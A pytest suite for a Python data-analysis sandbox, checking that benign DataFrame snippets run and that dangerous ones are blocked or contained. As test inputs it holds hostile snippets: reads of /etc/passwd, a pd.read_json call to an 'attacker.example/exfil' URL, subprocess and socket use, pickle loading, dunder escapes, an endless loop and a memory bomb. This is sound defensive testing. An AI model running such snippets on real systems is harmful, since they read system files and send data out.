"""Tests for sandbox executor and policy.

Coverage:
  (a) benign probe returns correct value
  (b) import os rejected by AST (parent-side, never spawns)
  (c) pd.read_pickle / string-literal path rejected by AST
  (d) infinite loop killed by timeout; caller gets SandboxResult, no raise
  (e) memory bomb contained (RLIMIT_AS); returns error not raise
  (f) exception in user code captured into SandboxResult.error, never raised
  (g) banned dunder access rejected
  (h) banned numpy attr rejected
  (i) open() call rejected by AST
"""
from __future__ import annotations

import os
import tempfile

import pandas as pd
import pytest

from app.sandbox.executor import run_code
from app.sandbox.policy import PolicyViolation, check_policy
from app.sandbox.models import SandboxResult


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture(scope="module")
def simple_csv(tmp_path_factory) -> str:
    """Write a tiny CSV and return its path."""
    tmp = tmp_path_factory.mktemp("data")
    path = str(tmp / "test.csv")
    df = pd.DataFrame({"x": [1.0, 2.0, 3.0, 4.0, 5.0], "y": [10, 20, 30, 40, 50]})
    df.to_csv(path, index=False)
    return path


@pytest.fixture(scope="module")
def simple_parquet(tmp_path_factory) -> str:
    """Write a tiny Parquet file and return its path."""
    tmp = tmp_path_factory.mktemp("data")
    path = str(tmp / "test.parquet")
    df = pd.DataFrame({"x": [1.0, 2.0, 3.0], "y": [10, 20, 30]})
    df.to_parquet(path, index=False)
    return path


# ---------------------------------------------------------------------------
# (a) Benign probe returns correct value
# ---------------------------------------------------------------------------

class TestBenignProbes:
    def test_column_mean_csv(self, simple_csv):
        result = run_code("df['x'].mean()", simple_csv)
        assert result.ok is True
        assert result.error is None
        assert result.value == pytest.approx(3.0)

    def test_column_mean_parquet(self, simple_parquet):
        result = run_code("df['x'].mean()", simple_parquet)
        assert result.ok is True
        assert result.value == pytest.approx(2.0)

    def test_multi_line_computation(self, simple_csv):
        code = "mean_x = df['x'].mean()\nmean_y = df['y'].mean()\nmean_x + mean_y"
        result = run_code(code, simple_csv)
        assert result.ok is True
        assert result.value == pytest.approx(3.0 + 30.0)

    def test_stdout_captured(self, simple_csv):
        result = run_code("print('hello sandbox')\ndf['x'].sum()", simple_csv)
        assert result.ok is True
        assert "hello sandbox" in result.stdout
        assert result.value == pytest.approx(15.0)

    def test_duration_positive(self, simple_csv):
        result = run_code("df['x'].mean()", simple_csv)
        assert result.duration > 0

    def test_numpy_available(self, simple_csv):
        result = run_code("np.sqrt(df['x']).sum()", simple_csv)
        assert result.ok is True

    def test_math_available(self, simple_csv):
        result = run_code("math.sqrt(4.0)", simple_csv)
        assert result.ok is True
        assert result.value == pytest.approx(2.0)

    def test_statistics_available(self, simple_csv):
        result = run_code("statistics.mean(df['x'].tolist())", simple_csv)
        assert result.ok is True
        assert result.value == pytest.approx(3.0)


# ---------------------------------------------------------------------------
# (b) import os rejected by AST — policy fires before spawn
# ---------------------------------------------------------------------------

class TestImportRejection:
    def test_import_os(self, simple_csv):
        result = run_code("import os\nos.listdir('.')", simple_csv)
        assert result.ok is False
        assert "PolicyViolation" in result.error
        assert "os" in result.error

    def test_import_sys(self, simple_csv):
        result = run_code("import sys\nsys.exit()", simple_csv)
        assert result.ok is False
        assert "PolicyViolation" in result.error

    def test_import_subprocess(self, simple_csv):
        result = run_code("import subprocess\nsubprocess.run(['id'])", simple_csv)
        assert result.ok is False
        assert "PolicyViolation" in result.error

    def test_import_socket(self, simple_csv):
        result = run_code("import socket\nsocket.create_connection(('localhost',80))", simple_csv)
        assert result.ok is False
        assert "PolicyViolation" in result.error

    def test_from_import_os(self, simple_csv):
        result = run_code("from os import path\npath.exists('.')", simple_csv)
        assert result.ok is False
        assert "PolicyViolation" in result.error

    def test_import_ctypes(self, simple_csv):
        result = run_code("import ctypes", simple_csv)
        assert result.ok is False
        assert "PolicyViolation" in result.error


# ---------------------------------------------------------------------------
# (c) Dangerous capabilities rejected by AST
# ---------------------------------------------------------------------------

class TestCapabilityRejection:
    def test_read_pickle_attr(self, simple_csv):
        """pd.read_pickle triggers RCE via pickle __reduce__ — must be rejected."""
        result = run_code("pd.read_pickle('data.pkl')", simple_csv)
        assert result.ok is False
        assert "PolicyViolation" in result.error

    def test_read_pickle_string_literal_path(self, simple_csv):
        """String-literal path is caught by the path/URL literal check."""
        result = run_code("pd.read_csv('/etc/passwd')", simple_csv)
        assert result.ok is False
        assert "PolicyViolation" in result.error

    def test_string_literal_url(self, simple_csv):
        result = run_code("pd.read_json('http://attacker.example/exfil')", simple_csv)
        assert result.ok is False
        assert "PolicyViolation" in result.error

    def test_to_csv_rejected(self, simple_csv):
        result = run_code("df.to_csv('/tmp/out.csv')", simple_csv)
        assert result.ok is False
        assert "PolicyViolation" in result.error

    def test_open_call_rejected(self, simple_csv):
        result = run_code("open('/etc/passwd').read()", simple_csv)
        assert result.ok is False
        assert "PolicyViolation" in result.error

    def test_dunder_access_rejected(self, simple_csv):
        result = run_code("df.__class__.__bases__", simple_csv)
        assert result.ok is False
        assert "PolicyViolation" in result.error

    def test_numpy_fromfile_rejected(self, simple_csv):
        result = run_code("np.fromfile('data.bin')", simple_csv)
        assert result.ok is False
        assert "PolicyViolation" in result.error

    def test_numpy_load_rejected(self, simple_csv):
        result = run_code("np.load('data.npy')", simple_csv)
        assert result.ok is False
        assert "PolicyViolation" in result.error


# ---------------------------------------------------------------------------
# (d) Infinite loop killed by timeout — server unaffected
# ---------------------------------------------------------------------------

class TestTimeout:
    def test_infinite_loop_returns_error(self, simple_csv):
        result = run_code("while True: pass", simple_csv, timeout_s=3)
        assert result.ok is False
        assert "timeout" in result.error.lower()

    def test_caller_not_blocked_after_timeout(self, simple_csv):
        """Verify caller resumes within reasonable time after timeout fires."""
        import time
        t = time.perf_counter()
        result = run_code("while True: pass", simple_csv, timeout_s=2)
        elapsed = time.perf_counter() - t
        assert result.ok is False
        # Should complete shortly after timeout (allow 4s buffer for spawn overhead)
        assert elapsed < 6

    def test_subsequent_call_works_after_timeout(self, simple_csv):
        """Verify subsequent calls succeed after a timed-out child was reaped."""
        run_code("while True: pass", simple_csv, timeout_s=2)
        result = run_code("df['x'].mean()", simple_csv)
        assert result.ok is True
        assert result.value == pytest.approx(3.0)


# ---------------------------------------------------------------------------
# (e) Memory bomb contained by rlimit
# ---------------------------------------------------------------------------

class TestMemoryBomb:
    def test_memory_bomb_contained(self, simple_csv):
        # Attempt to allocate 4 GB; should be killed by RLIMIT_AS
        code = "x = bytearray(4 * 1024 * 1024 * 1024)"
        result = run_code(code, simple_csv, timeout_s=10, mem_mb=256)
        assert result.ok is False
        # Error can be MemoryError, rlimit OOM, or killed-by-signal (None result)
        # Key invariant: the call returns without raising, ok is False

    def test_reasonable_allocation_succeeds(self, simple_csv):
        # A small allocation should work fine
        code = "x = bytearray(1024 * 1024); len(x)"  # 1 MB
        result = run_code(code, simple_csv, timeout_s=10)
        assert result.ok is True


# ---------------------------------------------------------------------------
# (f) User-code exception captured into SandboxResult.error — never raised
# ---------------------------------------------------------------------------

class TestExceptionCapture:
    def test_name_error_captured(self, simple_csv):
        result = run_code("undefined_variable + 1", simple_csv)
        assert result.ok is False
        assert result.error is not None
        assert "NameError" in result.error

    def test_type_error_captured(self, simple_csv):
        result = run_code("df['x'] + 'not_a_number'", simple_csv)
        assert result.ok is False
        assert result.error is not None

    def test_zero_division_captured(self, simple_csv):
        result = run_code("1 / 0", simple_csv)
        assert result.ok is False
        assert "ZeroDivisionError" in result.error

    def test_index_error_captured(self, simple_csv):
        result = run_code("df.iloc[9999]['x']", simple_csv)
        assert result.ok is False
        assert result.error is not None

    def test_result_is_sandboxresult(self, simple_csv):
        """run_code always returns SandboxResult, never raises."""
        for code in ["1/0", "import os", "while True: pass"]:
            r = run_code(code, simple_csv, timeout_s=2)
            assert isinstance(r, SandboxResult)


# ---------------------------------------------------------------------------
# (g) SandboxResult model
# ---------------------------------------------------------------------------

class TestSandboxResultModel:
    def test_ok_true_shape(self, simple_csv):
        r = run_code("42", simple_csv)
        assert r.ok is True
        assert r.value == 42
        assert r.error is None
        assert isinstance(r.stdout, str)
        assert r.duration > 0

    def test_ok_false_shape(self, simple_csv):
        r = run_code("import os", simple_csv)
        assert r.ok is False
        assert r.error is not None
        assert r.value is None


# ---------------------------------------------------------------------------
# Policy unit tests (no subprocess — fast)
# ---------------------------------------------------------------------------

class TestPolicyUnit:
    def test_allowed_code_passes(self):
        check_policy("df['x'].mean()")  # should not raise

    def test_import_os_raises(self):
        with pytest.raises(PolicyViolation):
            check_policy("import os")

    def test_dunder_raises(self):
        with pytest.raises(PolicyViolation):
            check_policy("df.__class__")

    def test_path_literal_raises(self):
        with pytest.raises(PolicyViolation):
            check_policy("pd.read_csv('/etc/passwd')")

    def test_url_literal_raises(self):
        with pytest.raises(PolicyViolation):
            check_policy("pd.read_json('https://attacker.example/x')")

    def test_read_pickle_attr_raises(self):
        with pytest.raises(PolicyViolation):
            check_policy("pd.read_pickle('x')")  # caught by attr check before literal

    def test_numpy_fromfile_raises(self):
        with pytest.raises(PolicyViolation):
            check_policy("np.fromfile('data.bin')")

    def test_syntax_error_raises_policy_violation(self):
        with pytest.raises(PolicyViolation):
            check_policy("def (broken syntax")
